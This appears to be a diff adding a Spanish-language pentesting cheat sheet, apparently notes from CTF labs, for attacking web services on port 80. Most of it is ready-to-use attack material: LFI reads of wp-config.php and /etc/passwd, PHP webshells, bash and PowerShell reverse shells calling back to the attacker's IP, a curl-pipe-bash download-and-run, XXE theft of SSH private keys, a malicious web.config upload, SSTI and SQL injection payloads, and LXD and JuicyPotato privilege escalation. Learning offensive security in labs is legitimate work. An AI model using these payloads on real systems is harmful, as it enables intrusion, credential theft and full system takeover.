@@ -1,0 +1,871 @@
+📌 Es el puerto estándar del protocolo HTTP (HyperText Transfer Protocol).
+
+    HTTP es el protocolo que permite la comunicación entre:
+
+        🌐 Navegador (cliente)
+        🖥️ Servidor web
+
+❌ HTTP NO cifra la información.
+
+    Eso significa que:
+
+        Las credenciales pueden ser interceptadas.
+        El tráfico puede ser modificado (Man-in-the-Middle).
+        Se puede espiar el contenido.
+
+    Por eso hoy en día casi todo usa HTTPS.
+
+🧪 En auditoría / pentesting
+
+    Si el puerto 80 está abierto, se revisa:
+
+        Directorios ocultos
+        Versiones del servidor (Apache, Nginx, IIS)
+        Vulnerabilidades web (XSS, SQLi, SSTI…)
+        Archivos sensibles expuestos
+
+🎯 Flujo pentesting web en el puerto 80
+
+    1️⃣ Para que un dominio lo reconozca el navegador cuando lo introduzcamos en el navegador, en el terminal introducimos el siguiente comando: 
+		
+            echo "<IP> <DOMAIN>" | sudo tee -a /etc/hosts
+		
+        Si falla, borrar la linea que contenga este dominio en la siguiente ruta y volver a probar: 
+		
+            sudo nano /etc/hosts
+
+    2️⃣ Explorar el sitio y consultar página web con cabeceras HTTP y código de respuestas desde el terminal:
+
+            curl -i <IP>
+
+        Buscar algún comentario o alguna función que parezca interesante dentro del código (ctrl + u). Si hay algún fichero, se puede descargar usando el comando: 
+
+            curl -O http://<IP>/<file>.zip
+
+    3️⃣ Para ver las tecnologías que tiene la página web, usamos Wappalyzer o la siguiente herramienta:
+
+            whatweb <IP>
+
+        Investigamos posibles vulnerabilidades que puedan tener las tecnologías que utiliza la web. 
+
+            ➡️ WordPress
+
+                1. Enumerar los directorios a través de dirsearch. La ubicación predeterminada para los plugins en WordPress es: 
+
+                        http://<IP_víctima>/wp-content/plugins
+
+                    El estándar para este tipo de blogs es que contenga un fichero llamado "index.php" en blanco en la raíz del directorio /plugins. Si no está, se ha borrado, por lo que
+                    seguiremos investigando otros directorios. 
+
+                    En algunos casos hay ficheros readme.txt donde podemos ver información, entre ellas la versión del plugin. En el navegador buscaremos información sobre el publin para 
+                    ver si hay algún exploit (ebook-download 1.1 wordpress plugin exploit).
+
+                2. Después de hacer una búsqueda en el navegador, nos dicen que naveguemos a la siguiente ruta: 
+
+                        http://<IP_víctima>/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
+
+                    Esto nos descarga el fichero wp-config.php. En dicho fichero nos encontramos la siguiente información valiosa: 
+
+                        · DB_NAME
+                        · DB_USER 
+                        · DB_PASSWORD
+
+                3. Interceptar peticiones a través de BurpSuite y lo enviamos a Repeater para poder leer el contenido del fichero más visual. Una vez en BurpSuite, intentaremos leer el 
+                   fichero /etc/passwd (ya que tenemos la vulnerabilidad LFI) sustituyendo el contenido después de ebookdownloadurl=
+
+                        /wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/etc/passwd
+
+                    Y esto nos devuelve varias rutas, como la del usuario:
+
+                        user:x:1000:1000:user:/home/user:/bin/bash
+
+                4. Se continua con el puerto 1337. Se puede encontrar información útil mediante un ataque de fuerza bruta al siguiente archivo: 
+
+                        /proc/{PID}/cmdline
+
+                    El archivo muestra el comando utilizado para ejecutar el proceso con el PID correspondiente (PID = ID del proceso). Para verlo, se ejcuta un nc -nvlp <PORT> y se 
+                    reinicia el proceso en segundo plano pulsando la combinación Ctrl + Z. Usando el comando ps se verifican los PID de este proceso. Ahora se usa el comando anterior
+                    con el PID correspondiente. 
+
+                    Para hacer un ataque de fuerza bruta, con la petición anterior desde BurpSuite, enviaremos una solicitud para acceder al archivo "/proc/1/cmdline" y verificar sin 
+                    la respuesta del servidor es la correcta. 
+
+                    El contenido del archivo devuelto incluye el comando utilizado para ejecutar el proceso para el PID correspondiente. 
+
+                5. Lanzar un ataque de fuerza bruta (Brute Forzin PID) con un script de python. 
+
+                    El script repite el proceso de envío de la solicitud al archivo de destino y realiza una limpieza menor de la response para facilitar su comprensión. El rango de PID 
+                    que usaremos será de 1 a 1000, ya que es un rango razonable para comenzar. 
+
+                        import requests
+
+                        for i in range(1, 1000):
+                            r = requests.get("http://<IP>/wp-content/plugins/ebookdownload/filedownload.php?ebookdownloadurl=/proc/"+str(i)+"/cmdline")
+                            out = (r.text.replace('/proc/'+str(i)+'/cmdline','').replace('<script>window.close()</script>','').replace('\00',' '))
+                            
+                            if len(out)>1:
+                                print("PID"+str(i)+" : "+out)
+
+                    Se encuentra un proceso que tenía un comando que hacía referencia al puerto 1337. El comando para este proceso indica que gdbserver se está ejecutando en el puerto 1337.
+
+                        sh -c while true;do su user -c "cd /home/user; gdbserver -once 0.0.0.0:1337 /bin/true";done
+
+                    GDB (GNU Project Debugger) es una herramienta de depuración que te ayuda a explorar tus programas mientras se ejecutan y también te permite ver qué sucede exactamente 
+                    cuándo tu programa falla. gdbserver es un programa que permite ejecutar GDB en una máquina diferente a la que está ejecutando el programa que se está depurando.
+
+                6. Buscar en Google exploits disponibles para gdbserver, encontramos esta vulnerabilidad de ejecución remota de código en la versión 9.2 de gdbserver. Siguiendo el exploit, 
+                    primero genere el shellcode usando msfvenom: 
+
+                        msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP_LOCAL> LPORT=4444 PrependFork=true -o rev.bin
+
+                    Luego, iniciamos un listener con Netcat en el puerto 4444 (como se especifica en la variable LPORT de msfvenom) con el siguiente comando:
+                    
+                        nc -nvlp 4444
+
+                    Y ahora ejecutamos el exploit con los siguientes parámetros. 
+
+                        python3 gdb_rce.py <IP_víctima>:1337 rev.bin
+
+                    Estabilizamos la terminal con el siguiente comando: 
+
+                        python3 -c "import pty;pty.spawn('/bin/bash')"
+
+                7. Realizar una escalada de privilegios
+            
+                    Enumeramos todos los procesos que se ejecutan en el sistema usando el comando ps auxww. 
+
+                        find /var/run/screen/S-root -empty -exec screen -dmS root ;
+
+                    Devuelve un proceso que crea una sesión screen dentro de un bucle do-while, el cual se ejecuta como root. screen es un multiplexor de terminal similar a tmux. Permite 
+                    iniciar una sesión y abrir cualquier número de ventanas (terminales virtuales) dentro de ella. Los procesos que se ejecutan en Screen seguirán ejecutándose incluso cuando 
+                    su ventana no esté visible e incluso si se desconecta. Al desconectar la sesión, el proceso que se inició originalmente desde la pantalla sigue ejecutándose y es gestionado 
+                    por la propia pantalla. El proceso puede volver a conectar la sesión posteriormente, y los terminales siguen ahí, tal como estaban.
+
+                    El comando screen -dmS root significa que se inicia una sesión de screen en modo separado y que esta sesión se denomina “root”. Al crear una nueva sesión de pantalla, se 
+                    crea un directorio en /var/run/screen, llamado S-{username} (username es el nombre de usuario del usuario que la creó). Dentro de este directorio, se crea un archivo de 
+                    sesión de pantalla con el nombre screen-session. Introducimos el siguiente comando: 
+
+                        screen -S <user>
+
+                    Por ejemplo, creemos una sesión de pantalla en nuestra máquina local con el usuario "dotguy" y el nombre de sesión “test_session”. Después de ejecutar el comando anterior,
+                    introducimos el siguiente para seleccionar el tipo de terminal que queremos.
+
+                        export TERM=xterm
+
+                    Y lanzamos screen accediendo a un screen, previamente creado, del usuario root y cuyo nombre del screen es también root para conseguir escalar al mismo.
+
+                        screen -x root/root
+
+    4️⃣ Listar directorios a través de respuestas HTTP (Fuzzing)
+
+        dirsearch -u <IP>
+
+    5️⃣ Enumerar con la herramienta gobuster / fuzz desde la ruta /usr usando el diccionario que más útil sea:
+        
+        gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
+
+        gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x txt,rdp,php,asp
+            
+        gobuster dir -u http://<IP> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 --no-error
+
+        gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x aspx,asp,php,txt,config
+            
+        ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+    6️⃣ Buscar los subdominios que puede tener una web:
+		
+        gobuster vhost --append-domain -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://<DOMAIN>
+
+            Si el subdominio se trata de un repositorio en la nube de AWS, de Amazon, para listar los directorios del subdominio, se usará la herramienta awscli.
+
+    7️⃣ Probar rutas o archivos conocidos: 
+
+            /login.php
+            /admin
+
+        Después de realizar la enumeración de directorios, ir probando uno a uno y ver los ficheros que pueda contener. 
+
+    8️⃣ Ataque de fuerza bruta
+
+        En el caso que tengamos un formulario de admin, podemos intentar realizar un ataque de fuerza bruta. 
+
+            Se crea un fichero con las contraseñas más comunes llamado password.txt y otro llamado usuario.txt para los usuarios.
+
+            Luego ejecutamos el script ataqueFuerzaBruta.py. Hay que tener en cuenta que hay que realizar los siguientes cambios: 
+
+                LOGIN_URL → Dominio junto al recurso del login al cual queremos acceder.
+                USERNAME → Nombre de usuario o fichero donde se encuentra el listado de posibles usuarios. 
+                PASSWORD_FILE → Fichero donde se encuentra el listado de posibles contraseñas. 
+                
+    9️⃣ AWS — Amazon Web Services (subdmains) ☁️
+
+        Configurar nube > aws configure
+
+            - AWS Acces Key ID: temp
+            - AWS Secret Access Key: temp
+            - Default region name: temp
+            - Default output format: temp
+
+        sudo apt install awscli
+
+        Listar los directorios que hay en el subdominio > aws --endpoint=http://<SUBDOMAIN> sX ls sX://<DOMAIN>
+
+        Lanzamos scripts (reverse shell)
+
+            - Fichero .php para subirlo a la nube > echo '<?php system($_GET["cmd"]); ?>' > shell.php
+            - Subir el fichero > aws --endpoint=http://<SUBDOMAIN> sX cp shell.php sX://<DOMAIN>
+            - Crear Listener en local (cambiar siempre que se reinicie la máquina) > echo "bash -i >& /dev/tcp/<IP_LOCAL>/1337 0>&1" > shell.sh
+            - Abrir escuchas en el puerto > nc -nvlp <PORT>
+            - Crear server web > python3 -m http.server 8000
+            - Introducir en el navegador > http://<DOMAIN>/shell.php?cmd=curl%20<IP_LOCAL>:8000/shell.sh|bash
+            - Listar (ls), cambiar de directorio (cd) y ver ficheros (cat)
+
+    🔟 Ruta /assets
+
+        Dentro de esta ruta, podemos encontrar muchos archivos que nos pueden ser útiles. 
+
+            ➡️ Descargar ficheros swap
+
+                Este tipo de ficheros almacenan los cambios realizados en el búfer. Se crea debido a un fallo de la aplicación vim. Se puede leer de la siguiente manera: 
+
+                    vim -r
+
+                    string <nombreFileSwap> >> file.txt
+                    tac file.txt
+                
+                Si podemos leer el código, se puede modificar a través de BurpSuite enviando una petición. Buscamos el lenguaje del código para entenderlo. Intentamos iniciar sesión 
+                por ejemplo con admin y admin.
+
+                Una vez capturada la llamada, enviamos a "send to Repeater" para poder modificar la request. Añadimos [] a las variables username y password después del nombre. Al 
+                lanzar la petición, si devuelve 302, significará éxito en el login. 
+                
+                Si hay un recurso para subir ficheros, accedemos a él desde el navegador. Al ser un fichero php, hacemos el siguiente script: 
+
+                    echo "<?php phpinfo(); ?>" > test.php
+
+                Esto es para hacer una prueba. Una vez subido, si queremos comprobarlo, podemos hacerlo mediante la herramienta gobuster enumerando los directorios. Debería de salir 
+                un directorio donde se almacenen los ficheros que se suban a través del directorio de upload. Se encontrará haciendo una enumeración de direcotorios. Si ha funcionado 
+                correctamente, se va a crear un fichero que contenga la función system() y el parámetro cmd para poder ejecutar comandos. Se crea un nuevo fichero con el siguiente 
+                código: 
+
+                    <?php echo system($_REQUEST['cmd']);?>
+
+                    echo “<?php echo system($_REQUEST['cmd']);?>” > webshell.php
+
+                Ahora se realiza la misma acción que antes y se sube el fichero. Accedemos al fichero en la uri y al final, introducimos el parámetro ?cmd=id. Interceptaremos la petición 
+                a través de BurpSuite. Vamos a intentar realizar una reverse shell, para lo que seleccionaremos en la request con el clic derecho la opción "change request method" Para que
+                se comvierta en una peticion POST. En el parámetro cmd de la petición de BurpSuite introduciremos el siguiente comando, codificandolo (seleccionado el texto y pulsando las 
+                teclas Ctrl + U): 
+
+                    /bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP_ADDRESS/LISTENING_PORT 0>&1'
+
+                Ahora ejecutamos en nuestro local un listener y una vez esté corriendo, ejecutamos la llamada en Burpsuite. 
+
+                    sudo nc -lvnp 443
+
+                Como se ha visto, se ejecuta como usuario www-data. Este es un usuario predeterminado en sistemas de servidores web instalados. Al tener permisos de usuario, investigamos
+                hasta ver algún archivo de configuración que nos pueda servir. 
+
+                Si encontramos credenciales, podemos acceder mediante ssh. 
+
+                Si queremos escalar privilegios, al ser Linux, se puede intentar con GTFOBins.
+
+    1️⃣1️⃣ Vulnerabilidades 
+
+        ➡️ Directory Traversal o Local File Inclusion (LFI)
+
+            Si vemos que en una url se añade ?file=home.php, estamos ante una vulnerabilidad de Directory Traversal y podemos usar la LFI. Añadiremos la siguiente ruta: 
+
+                http://<IP>/?file=../../../../etc/passwd
+
+            Nos devuelve info sobre root de linux. Si lo hacemos a travé sde BurpSuite, nos lo muestra más gráfico. Otra posibilidad de comprobarlo es con el comando curl.
+
+            Si nos encontramos con tftp (que permite la subida y descarga de ficheros), como este ejemplo: 
+
+                tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin
+
+            El protocolo tftp se utiliza para la transferencia de archivos entre dispositivos. Usa UDP en lugar de TCP. Para enumerar, se usa el siguiente puerto: 
+
+                69/udp open|filtered tftp
+    
+            El protocolo tftp no permite listar archivos, pero se puede descargar archivos comunes que suelen estar en servidores mal configurados. Se usará el siguiente 
+            comando para comprobar si está instañado tftp y las opciones que podemos ejecutar.
+
+                man tftp 
+
+            Después de esto, se intenta hacer una reverse shell, modificando los valores IP (tun0) como el puerto (4444) del siguiente script en php. 
+
+                <?php
+                // PHP Reverse Shell
+                $ip = '<IP_LOCAL>';  // ← Cambia esto por tu IP tun0 (HTB VPN)
+                $port = <PORT>;   // ← Cambia esto por el puerto que usarás
+
+                $sock = fsockopen($ip, $port);
+                $proc = proc_open("/bin/sh", [
+                0 => $sock,
+                1 => $sock,
+                2 => $sock
+                ], $pipes);
+                ?>
+
+            Una vez modificado, se usa el siguiente comando para subirlo por tftp: 
+
+                tftp <IP> -c put shell.php
+
+            Para comprobarlo, se puede usar la herramienta Wireshark, donde se ven las peticiones que se hacen. 
+
+            Una vez subido, en una terminal (siempre donde esté el fichero con el que estemos trabajando) ejecutamos un listener: 
+
+                nc -lvnp <PORT>
+
+            Mientras que en otra terminal, ejecutamos el siguiente comando: 
+
+                curl 'http://{<IP>}/?file=/var/lib/tftpboot/shell.php'
+
+            Con ese comando se ven los ficheros que se encuentran en esas ruta. Como no es interactiva, usaremos el siguiente comando para estabilizarla
+            a Python. 
+
+                python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+            Una vez que hemos accedido a esta ruta, vamos a realizar un Movimiento Lateral. Usamos ls -la para que nos liste los ficheros que pueda haber. Buscamos 
+            en los ficheros que haya para ver si encontramos algún fichero interesante donde podamos encontrar la contraseña (ya que el usuario lo comprobamos cuando
+            vimos la petición en BurpSuite).
+
+            Una vez encontramos las credenciales, nos conectamos usando el siguiente comando en la terminal abierta. 
+
+                su <user>
+
+            Para escalar privilegios, lo primero que hay que hacer es comprobar a que grupo pertenece el usuario al que estamos conectados (LXD, ___ , etc.). Para ello usamos el siguiente 
+            comando:
+
+                id
+
+            En primer lugar, en la máquina atacante (nuestra local) crearemos una imagen con acceso a root. Se usará la imagen Alpine Linux. Clonamos el repositorio en el directorio del 
+            proyecto utilizando el siguiente comando.
+
+                git clone https://github.com/saghul/lxd-alpine-builder.git
+
+            Una vez creado, vamos al directorio donde hemos descargado el repositorio y ejecutamos el siguiente comando, que generará un arvhivo .tar.gz: 
+
+                ./build.alpine
+
+            Ahora subiremos la imagen mediante http. En un terminal nuevo (dentro del directorio donde se encuentra el archivo) introduciremos el siguiente comando con el puerto 8888 
+            (se comprobará si está disponible con el comando sudo lsof -i :8888): 
+
+                python3 -m http.server 8888
+
+            Y ahora en la máquina donde nos habíamos conectado con el usuario, introducimos el siguiente comando para que suba el fichero: 
+
+                 wget http://<IP_LOCAL>:8888/alpine-minirootfs-3.22.0-x86_64.tar.gz
+
+            Una vez en la máquina víctima, se creará un directorio y extraemos en ese directorio el fichero.
+
+                mkdir -p lxd-rootfs/rootfs
+
+                tar -xzf ../alpine-minirootfs-3.22.0-x86_64.tar.gz -C rootfs
+
+            Creamos el fichero metadata.yaml con el siguiente código: 
+
+                cat <<EOF > metadata.yaml
+                architecture: "x86_64"
+                creation_date: $(date +%s)
+                properties:
+                description: "Alpine 3.22"
+                os: "Alpine"
+                release: "3.22"
+                EOF
+
+            Y una vez creado, el siguiente paso es crear el .tar.gz, con formato LXD válido. 
+
+                tar -czf alpine-lxd.tar.gz metadata.yaml rootfs
+
+            Y por último, importamos la imagen LXD desde un archivo válido. 
+
+                lxc image import alpine-lxd.tar.gz --alias pwned
+
+            Para continuar la escalada, usamos los siguientes comandos: 
+
+                lxc init pwned esc -c security.privileged=true
+                lxc config device add esc host-root disk source=/ path=/mnt/root recursive=true
+                lxc start esc
+                lxc exec esc /bin/sh
+
+            Y ya podremos realizar cualquier acción de administrador.
+        
+        ➡️ XML External Entity injection (XXE)
+
+            En Windows, para leer lo que en Linux sería /etc/passwd, en Windows es tal que así: 
+
+                C:\windows\system32\drivers\etc\hosts
+
+            Si nos encontramos con un formulario de pedidos, podemos realizar la petición con BurpSuite. Buscando por internet, añadiendo & delante de el item o producto, nos devuelve la 
+            salida del archivo win.ini. 
+            
+                <?xml version = "1.0"?>
+                    <!DOCTYPE root [<!ENTITY test SYSTEM 
+                    'file:///c:/windows/win.ini'>]>
+
+                    <data>&example;</data>
+
+            Devuelve un listado con los directorios que tiene la máquina. Tenemos que ir investigando directorio por directorio para averiguar alguna información que nos pueda servir de 
+            ayuda. 
+
+            Si encontramos el directorio .ssh, podríamos recuperar la clave privada. Para ello sustituimos este código en BurpSuite: 
+
+                <!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/users/<USER>/.ssh/id_rsa'>]>  (WINDOWS)
+                <!DOCTYPE root [<!ENTITY test SYSTEM 'file:////home/user/.ssh/id_rsa'>]>  (LINUX)
+
+            Devuelve una clave RSA, que se guardará en un fichero local (id_rsa, por ejemplo). En el directorio donde se encuentra el proyecto, ejecutaremos los siguientes comandos: 
+
+                mkdir rsa
+
+                touch id_rsa
+
+                vim id_rsa (copiarlo empezando con -----BEGIN OPENSSH PRIVATE KEY----- y terminando con -----END OPENSSH PRIVATE KEY-----)
+
+                chmod 400 id_rsa (400 son permisos de solo de lectura)
+
+            Una vez realizados estos comandos, nos conectamos vía ssh: 
+
+                ssh -i id_rsa <USER>@<IP>
+
+            Ya estaremos conectados al usuario. Para acceder a permisos de administrador, hay que hacer una escalada de privilegios. Comprobamos los privilegios actuales con el siguiente 
+            comando: 
+
+                whoami /priv
+
+            No tiene privilegios especiales, por lo que hay que navegar para encontrar algo que nos pueda ayudar. Se encuentra un archivo llamado job.bat, el cual intentamos ejecutar: 
+
+                icacls job.bat (Busca la ubicación del fichero → where /r C:\ job.bat)
+
+            Nos dice que el grupo BUILTIN/Users tiene el control total (F) sobre el fichero. Ya que la máquina no tiene acceso a internet, hay que subir el fichero nc64.exe. Descargamos 
+            el ejecutable en nuestro local y donde tengamos el ejecutable descargado, ejecutamos en una terminal (desde la máquina atacante) el listener:
+
+                sudo python -m http.server 80
+
+            Desde la terminal Windows del usuario, usamos el siguiente comando para poner la terminal en PowerShell: 
+            
+                powershell
+
+            Una vez esté la terminal en powershell, introducimos el siguiente comando para subirlo: 
+
+                wget http://<IP_LOCAL>/nc64.exe -outfile nc64.exe 
+
+            Salimos de la powershell escribiento exit y modificaremos el script usando el siguiente comando. Hay que hacerlo desde la terminal de Windows. 
+
+                echo C:\Log-Management\nc64.exe -e cmd.exe <IP_LOCAL> 8888 > C:\Log-Management\job.bat
+
+            Antes de ejecutarlo, abrimos una nueva terminal y ejecutamos el netcat:
+
+                sudo nc -lvnp 8888
+
+            Y entraremos como administrador. 
+
+        ➡️ RCE (Ejecución Remota de Código)
+
+            Para poder engañar a subida de ficheros .aspx, se realizan las siguientes acciones: 
+
+                1. Crear un fichero web.config que contendrá el siguiente código: 
+
+                    <?xml version="1.0" encoding="UTF-8"?>
+                    <configuration>
+                    <system.webServer>
+                        <handlers accessPolicy="Read, Script, Write">
+                            <add name="web_config" path="*.config" verb="*"
+                                modules="IsapiModule"
+                                scriptProcessor="%windir%\system32\inetsrv\asp.dll"
+                                resourceType="Unspecified"
+                                requireAccess="Write"
+                                preCondition="bitness64" />
+                        </handlers>
+                        <security>
+                            <requestFiltering>
+                                <fileExtensions>
+                                <remove fileExtension=".config" />
+                                </fileExtensions>
+                                <hiddenSegments>
+                                <remove segment="web.config" />
+                                </hiddenSegments>
+                            </requestFiltering>
+                        </security>
+                    </system.webServer>
+                    </configuration>
+                    <%
+                    Set rs = CreateObject("WScript.Shell")
+                    Set cmd = rs.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://<IP_LOCAL>:8000/revshell.ps1')")
+                    o = cmd.StdOut.Readall()
+                    Response.write(o)
+                    %>
+
+                2. Crear el fichero revshell.ps1 con el siguiente código (todo en la misma línea): 
+
+                    $callback = New-Object System.Net.Sockets.TCPClient("<IP_LOCAL>",4444);$stream = $callback.GetStream();[byte[]]$bytes = 0..65535|%{0};
+                    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+                    $sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes
+                    ($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$callback.Close()
+
+                3. Ejecutar en una terminal (dentro del mismo directorio) el siguiente servidor: 
+
+                    python3 -m http.server 8000
+
+                4. Ejecutar en otra terminal (dentro del mismo directorio) el siguiente listener: 
+
+                    rlwrap nc -lvnp 4444
+
+                5. Subir el fichero web.config en el formulario de la web
+
+                6. Pegar en el navegador la ruta donde se alojan los ficheros cuando se suben, por ejemplo: 
+
+                    http://<IP_víctima>/UploadedFiles/web.config
+
+            Una vez estemos dentro, se va a intentar realizar una escalada de privilegios. 
+
+                1. Comprobar los privilegios que tiene el usuario. Si tiene el siguiente, se puede escalar usando JuicyPotato: 
+
+                    SeImpersonatePrivilege → Enabled
+
+                2. Crear una reverse shell (en la máquina local) con msfvenom usando el siguiente comando: 
+
+                    msfvenom -p windows/shell_reverse_tcp LHOST=<IP_LOCAL> LPORT=9001 -f exe -a x86 --platform windows -o shell.exe
+
+                3. Descargarse en la misma ruta donde estamos trabajando la herramienta JuicyPotato desde el siguiente repositorio: 
+
+                    https://github.com/ohpe/juicy-potato/releases/tag/v0.1 → JuicyPotato.exe
+
+                4. Transferir el archivo shell.exe a la máquina víctima, creando un listener en una terminal nueva, en la misma ruta usando el siguiente comando: 
+
+                    python3 -m http.server 80
+
+                5. En la máquina víctima, introducimos los siguientes comandos para subir shell.exe y JuicyPotato a la máquina víctima: 
+
+                    certutil -urlcache -f http://<IP_LOCAL>/shell.exe C:\Users\Public\shell.exe
+                    certutil -urlcache -f http://<IP_LOCAL>/JuicyPotato.exe C:\Users\Public\potato.exe  
+                
+                6. Ejecutamos un listener en nuestra máquina local: 
+
+                    nc -lvnp 9001
+
+                7. En la máquina víctima, nos vamos a la ruta /Public (donde están los ficheros) y ejecutamos potato.exe usando el siguiente comando: 
+                    
+                    C:\Users\Public\potato.exe -t * -p "C:\Users\Public\shell.exe" -l 1337
+                
+                8. Resultado esperado
+
+                    whoami → nt authority\system
+
+        ➡️ Reverse shell en PHP (Subida de ficheros)
+
+            Opción 1️⃣. Si al enumerar, se encuentra un sitio donde poder subir ficheros en php, se puede hacer una reverse shell. 
+
+                    1. Ejecutar la herramienta msconsole y ejecutaremos un exploit, realizando las siguientes opciones: 
+
+                        a. use exploit/multi/handler
+                        b. show options
+                        c. set payload php/meterpreter/reverse_tcp
+                        d. set LHOST <IP_LOCAL>
+                        e. set LPORT 5555
+                        f. set 
+                        g. ExitOnSession false
+                        h. run -j
+
+                    2. En otra terminal, ejecutamos el siguiente comando: 
+
+                        msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP_LOCAL> LPORT=5555 -f raw > shell.htb
+
+                            -p php/meterpreter/reverse_tcp → payload en PHP.
+                            LHOST → tu IP (tun0 de HTB normalmente).
+                            LPORT → puerto en el que escucharás (por ejemplo, 4444).
+                            -f raw → salida cruda (sin cabeceras).
+                            > writeup.htb → guardamos el payload en un archivo.
+
+                    3. Desde el directorio de subida de ficheros de la web, se rellena lo que convenga y se sube el fichero generado anteriormente (shell.htb).
+
+                    4. Se pulsa el botón "click here" o el que aparezca que nos lleve al directorio de ficheros subidos. 
+
+                    5. Volvemos a la terminal donde se está ejecutando meterpreter e introducimos el siguiente comando: 
+
+                        -i <sesión>
+
+                    6. Para estabilizar la consola, introducimos "shell".
+
+                Para escalar privilegios, nos dirigimos a la siguiente ruta: 
+
+                    /var/htb/bin
+
+                Y ejecutamos el siguiente ejecutable: 
+
+                    ./emergency
+                
+                Y ejecutamos el comando "id" y ya estaremos dentro de root.
+
+            Opción 2️⃣. Si hay un directorio para subir ficheros, se puede hacer una reverse shell para subir dichos ficheros. Al estar en php, nos descargamos del siguiente repositorio el 
+            siguiente fichero: 
+        
+                    git clone https://github.com/pentestmonkey/php-reverse-shell   
+                    
+                    php-reverse-shell.php file (para descargarlo, en caso de no descargar todo el paquete)
+
+                Lo subimos a través de la web (teniendo en cuenta cambiar el puerto y la IP antes de subirlo). Una vez subido, ejecutamos un netcat y el siguiente comando: 
+
+                    nc -lvnp <PORT>
+
+                    http://<IP>/uploads/php-reverse-shell.php
+
+                Introducimos el siguiente comando para estabilizar la shell: 
+
+                    python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+                Buscamos el directorio que nos pueda servir (que hayamos visto) y buscamos algún fichero que pueda contener las credenciales. También buscamos con el comando cat group en la 
+                ruta /etc información sobre los grupos. Una vez conseguida las credenciales, nos loguearemos y ya estaremos dentro del adminsitrador. 
+
+                    su <user>
+
+                En caso de que no funcione, hay que comprobar el grupo que tiene el usuario, para ello usamos el siguiente comando: 
+
+                    find / -group bugtracker 2>/dev/null
+
+                Nos mostrará los ficheros que se pueden ejecutar pos ser miembros de este grupo. Ejecutamos el fichero bugtracker y puede ejecutar un cat dentro del directorio /root y espera un 
+                ID. Vamos a conseguir que ejecute un cat alternativo: 
+
+                    1. Se crea un fichero cat dentro del directorio /tmp
+                    2. El contenido será /bin/bash
+                    3. Se le asignará permisos de ejecución chmod +x cat
+                    4. La primera posición del PATH será /tmp
+
+                Estos pasos pueden combinarse con este comando para realizar solo una ejecución: 
+
+                    echo "/bin/bash" > /tmp/cat ; chmod +x /tmp/cat ; PATH=/tmp:$PATH
+
+                Una vez realizado este cambio, se vuelve a ejecutar bugtracker y le proporcionamos un ID * y ya estaremos dentro de root.
+
+        ➡️ Template Engines (SSTI) 
+
+            Si en el campo de usuario / nombre usuario al introducir {{7*7}} nos devuelvre 49, significa que que es vulnerable a SSTI. Con la herramienta BurpSuite pondemos insertar
+            un payload y obtener una shell. Realizamos los siguientes pasos: 
+
+                1. Codificar el payload en base 64.
+
+                    echo -ne 'bash -i >& /dev/tcp/<IP_LOCAL>/4444 0>&1' | base64
+
+                2. Nos devuelve un payload:
+
+                    YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNS80NDQ0IDA+JjE=
+
+                3. Construiremos un payload SSTI básico para introducir en el parámetro "name", correspondiente a la request que se ha capturado mediante BurpSuite. Hay que sustituir 
+                el payload que hemos obtenido en el siguiente payload y cuando lo peguemos en BurpSuite para realizar la petición, hay que codificarlo usando la combinación de teclas
+                Ctrl + U: 
+
+                    {{config.__class__.__init__.__globals__['os'].popen('echo${IFS}<Payload_Obtenido_Base64>${IFS}|base64${IFS}-d|bash').read()}}
+
+                4. Ejecutar el listener con el siguiente comando: 
+                
+                    nc -lvvp 4444
+
+                5. Enviar la petición desde BurpSuite y ya estaremos dentro del usuario. 
+
+            Ahora hay que escalar de privilegios usando el tipo de escalada de privilegios de Linux Container Escape / Docker Escape (ver en el apartado tipos por SO).
+
+    1️⃣2️⃣ Exploits
+
+        Si se quiere buscar algún exploit en metasploit, usamos el siguiente comando: 
+
+            searchsploit <nombre_version_servicio>
+
+        Y nos devolverá un listado. Si alguno nos conviene, abrimos la consola de msconsole y buscamos el exploit y lo ejecutamos. 
+
+    1️⃣3️⃣ FORMULARIOS: 
+
+        Cuando haya un formulario de login o cualquier otro, se pueden probar las siguientes opciones:
+
+            · SELECT * FROM users WHERE username = ‘$username’ AND password = ‘$password’
+
+            · Injection SQL
+
+                admin'#
+                admin' OR 1=1-- - (esta condición siempre es True)
+                administrator' OR 1=1-- -
+
+                Este tipo de peticiones, las realizamos a través de BurpSuite. 
+
+            · Template Engines (SSTI) 
+
+                    {{7*7}}
+
+                    ➡️ Datos perfil usuario
+
+                        Si en el campo de usuario / nombre usuario al introducir {{7*7}} nos devuelvre 49, significa que que es vulnerable a SSTI. 
+
+                    ➡️ handlebars (NodeJS)
+
+                        En Hacktricks, buscamos handlebars (NodeJS) y tenemos el siguiente artículo:
+
+                            https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html?highlight=handlebars#handlebars-nodejs
+
+                        Hay un payload y nos fijamos en la línea {{this.push "return require('child_process').exec('whoami');"}}
+
+                        Esta línea indica al servidor que ejecute un comando específico del sistema (en este caso, whoami). Se puede cambiar esta línea para ejecutar diferentes comandos 
+                        en el servidor. 
+                        
